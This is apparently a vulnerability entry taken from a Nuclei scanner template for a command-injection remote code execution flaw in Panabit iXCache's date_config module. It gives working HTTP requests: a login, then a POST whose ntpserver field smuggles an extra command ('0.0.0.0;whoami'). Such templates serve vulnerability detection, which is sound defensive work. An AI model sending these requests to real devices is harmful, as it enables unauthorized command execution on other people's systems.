# Vulnerability: Panabit iXCache date_config - Remote Code Execution
**Classification:** PANABIT
**Source:** Nuclei Template (`panabit-ixcache-rce.yaml`)

## Description
Panabit iXCache date_config module has command splicing, resulting in the execution of arbitrary commands.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /login/userverify.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

POST /cgi-bin/Maintain/date_config HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

ntpserver=0.0.0.0;whoami&year=2021&month=08&day=14&hour=17&minute=04&second=50&tz=Asiz&bcy=Shanghai&ifname=fxp1
```

